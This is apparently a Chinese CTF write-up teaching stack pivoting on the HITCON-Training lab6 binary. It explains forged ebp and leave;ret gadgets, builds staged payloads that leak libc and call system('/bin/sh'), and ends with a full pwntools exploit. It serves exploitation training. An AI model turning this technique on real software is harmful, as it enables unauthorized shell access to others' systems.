# 栈迁移学习附例题

## 介绍

栈迁移可以解决栈溢出后，没有足够空间写入 payload 的情况。主要通过 伪造 ebp ，并利用 leave|ret gadget 劫持栈到预设位置。

> leave | ret == mov ebp,esp;pop ebp;ret

## [HITCON-Training-master lab6](https://github.com/scwuaptx/HITCON-Training)

### 题目介绍

程序为32 位打开 NX 防护：

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200305221400.png)

运行程序，提示输入，输入后退出程序：

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200305221521.png)

main 函数 read 存在栈溢出，可溢出长度为 0x40 - 0x28 ：

```python
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [esp+0h] [ebp-28h]

  if ( count != 0x539 )
    exit(1);
  ++count;
  setvbuf(_bss_start, 0, 2, 0);
  puts("Try your best :");
  return read(0, &buf, 0x40u);		//栈溢出
}
```

在可以溢出操作的空间很小，可以考虑使用栈迁移，当然你能找到超短的 shellcode 也可以。能不能进行 ROP ，emmm 需要修改 count 防止退出程序。那就用栈迁移吧。

### **利用思路**

*我们可以利用溢出 eip 调用 read 在劫持前，写入伪造栈空间内容（执行什么命令、有什么变量、伪造栈的ebp等）*

伪造 ebp 劫持当前栈到另外一个地方 stack 1 ；然后在 stack 1 泄露出 libc 基地址，并再次伪造 ebp 劫持当前栈到另外一个地方 stack 2；调用 system('/bin/sh') 。

**第一步**

我选择将当前栈 stack 0 ，劫持到内存地址为 bss+0x200 的stack 1。为什么是 bss+0x200 ？一开始劫持到 bss 报错，然后就选择高点的地址就成功了。

我们迁移栈之后，栈总不能是空的，什么都不执行就退出了，所以在这一步需要控制 stack 0 的 eip 调用 read ，写入 stack 1 的栈数据。

大致利用思路里说了，需要第二次迁移栈，所以我们也需要伪造 stack 1 ，以实现在将 stack 1 劫持到 stack 2 。

payload 0 构造如下：

```python
payload = 'a' * 0x28 #填充
payload += stack_1 #伪造ebp
payload += read_plt #调用read
payload += leave_ret #利用gadget将ebp赋值esp完成栈迁移
payload += p32(0)+p32(stack_1)+p32(0x100) #read传参
```

注意：输入 payload 0 依然在 stack 0 ，停在 read 等待输入状态。我们输入 payload 1 后才栈迁移到 stack 1 。

**第二步**

在这一步需要泄露 libc 基地址，调用一个有输出功能的函数，把某一个函数的真实地址输出出来，然后计算 libc 的偏移。

这一步还需要进行一次栈迁移，伪造的 ebp 已经在迁移进入 stack 1 前，已经在stack 0 通过 read 写入到 stack 1 的 ebp 位置，所以只需要调用 leave|ret gadget 就可以进行栈迁移。

既然进行栈迁移，就还是需要提前写入 stack 3 的数据，就需要再次调用 read 。payload 1 先提供一个用于写入stack 2 的 read 函数入口，至于 payload 2 在第三步分析。

payload 1 构造如下：

```python
payload = p32(stack_2) #伪造ebp
payload += p32(puts_plt) #调用输出函数
payload += p32(pop_ret) #返回
payload += p32(puts_got) #函数真实地址
payload += p32(read_plt) 
payload += p32(leave_ret) #利用gadget将ebp赋值esp完成栈迁移
payload += p32(0) + p32(stack_2) + p32(0x100) #read传参
```

**第三步**

这一步不需要再栈迁移，因此不需要再伪造 ebp ，用 0x8 数据填充占位即可。最终目的是执行 system('/bin/sh') ，system 地址可以通过查询 libc 后加上偏移得到，/bin/sh 获取有多种方法。可以在 libc 查，可以再次调用 read 输入。

payload 2 构造如下：

```python
payload = p32(0x11111111) #ebp占位
payload += p32(read_plt)
payload += p32(pop_ret) #返回
payload += p32(0) + p32(stack_1) + p32(0x100) #传参，将/bin/sh存储在stack1
payload += p32(system_addr)
payload += p32(0x22222222) #system压栈返回地址，垃圾填充即可
payload += p32(stack_1) #/bin/sh\0 地址
```

**栈空间图**

用 read 从 stack esp 写入的时候，各个指令顺序与计算机写入方式有关。假如 read  0x10 数据，会从输入地址向高地址写入 0x10 空间。写入一般为小端序，简单点就是写在前面的，存在后面。输入 ABCD ，录入 0x64636261 。所以 read 中填入命令越前地址越高越先被执行

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200307000025.png)

**完整exp**

```python
#!/usr/bin/env python
from pwn import*
context.log_level="debug"
 
p = process('./migration')
lib = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./migration')
 
read_plt = elf.symbols['read']
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
buf = elf.bss() + 0x500
buf2 = elf.bss() + 0x400
 
pop1ret = 0x804836d
pop3ret = 0x8048569
leave_ret = 0x08048418
 
puts_lib = lib.symbols['puts']
system_lib = lib.symbols['system']
 
p.recv()
 
log.info("*********************change stack_space*********************")
junk = 'a'*0x28
payload = junk + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x100)
p.send(payload)
 
 
log.info("*********************leak libc memory address*********************")
 
payload1 = p32(buf2) + p32(puts_plt) + p32(pop1ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret)
payload1 += p32(0) + p32(buf2) + p32(0x100)
p.send(payload1)
 
puts_add = u32(p.recv(4))
lib_base = puts_add - puts_lib
print "libc base address-->[%s]"%hex(lib_base)
system_add = lib_base + system_lib
print "system address -->[%s]"%hex(system_add)
 
log.info("*********************write binsh*********************")
payload3= p32(buf) + p32(read_plt) + p32(pop3ret) + p32(0) + p32(buf) + p32(0x100) + p32(system_add) + 'bbbb' + p32(buf)
p.send(payload3)
p.send("/bin/sh\0")
p.interactive()
```

